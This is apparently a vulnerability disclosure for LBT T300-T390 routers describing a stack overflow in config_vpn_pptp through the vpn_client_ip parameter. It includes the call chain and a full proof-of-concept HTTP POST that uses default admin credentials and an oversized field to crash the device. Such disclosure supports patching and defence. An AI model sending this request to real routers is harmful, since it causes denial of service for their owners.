# LBT router config_vpn_pptp function stack overflow vulnerability

> vendor:LBT
>
> product:T300-T390
>
> version:v2.2.1.8
>
> type:Stack Overflow

## Vulnerability Description

LBT T-T390 were discovered to contain a stack overflow via the vpn_client_ip parameter in the config_vpn_pptp function.

## Vulnerability Details

The calling process of this overflow function is as follows. The vpn_client_ip variable in the config_vpn_pptp function in the Rc program has a stack overflow. The rc program is started through its symbolic link init. The variable is obtained through the system NVRAM_GEtails
T function. The attacker can modify the request packet parameters through the VPN_PPTP.asp page. Incoming, ultimately causing a server denial attack.

The calling process of the overflow function is as follows:

Main()-> sub_40BEB8()-> start_single_service()->connect_vpn()->start_vpn_pptp()->config_vpn_pptp()

![image](https://github.com/cvdyfbwa/IoT_LBT_Router/assets/150313831/3b72c78c-67f3-40c3-a495-3011c66759ec)
![image](https://github.com/cvdyfbwa/IoT_LBT_Router/assets/150313831/fac6ee10-294a-45e0-ba16-40494f114270)


## POC

    POST /apply.cgi HTTP/1.1
    Host: 192.168.10.1
    Content-Length: 911
    Cache-Control: max-age=0
    Authorization: Basic YWRtaW46YWRtaW4=
    Upgrade-Insecure-Requests: 1
    Origin: http://192.168.10.1
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Referer: http://192.168.10.1/VPN_PPTP.asp
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close

    submit_button=VPN_PPTP&change_action=&vpn_pptp_auto=0&vpn_pptp_only=0&vpn_type=PPTP&vpn_pptp_enable=1&vpn_nat_enable=1&vpn_dns_enable=1&action=Apply&wb_pptp_enable=on&vpn_pptp_server=192.168.10.1&vpn_pptp_username=a&vpn_pptp_passwd=a&vpnc_auth=0&vpn_pptp_mppe=0&vpnc_stateful=0&vpn_pptp_mtu=1450&vpn_pptp_mru=1450&vpn_client_ip=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&vpn_pptp_redial_count=10&vpn_dst_enable=0&vpn_check_mode=0&web_vpn_nat_enable=on&web_vpn_dns_enable=on

